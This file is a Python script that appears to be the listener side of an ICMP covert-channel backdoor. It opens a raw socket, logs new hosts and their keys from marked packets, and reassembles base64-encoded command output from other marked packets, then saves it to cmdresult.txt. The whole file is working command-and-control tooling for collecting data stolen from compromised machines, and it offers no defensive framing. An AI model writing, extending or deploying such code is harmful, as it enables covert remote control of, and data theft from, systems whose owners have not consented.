import socket
import struct
from base64 import b64decode

rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
rawsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

cmdresult = []

while True:
    pkt = rawsocket.recvfrom(4096)
    message = pkt[0].decode("utf-8", "ignore")[-48:]
    ip = pkt[1][0]
    if "N &< >N@" in message:
        key = message.split("N &< >N@")[1]
        print("NEW_ONLINE  @  " + ip + "KEY IS: " + key)
    if " C* ` }0" in message:
        cmdresult.append(message.split(" C* ` }0")[1])
        if "@" in message:
            finalresult = ""
            for i in cmdresult:
                finalresult = finalresult + i
            finalresult = finalresult[:-1]
            finalresult = b64decode(finalresult.encode(encoding="utf-8"))
            finalresult = finalresult.decode()
            print(finalresult)
            with open("cmdresult.txt", "w") as f:
                f.write(finalresult)
            cmdresult = []
        
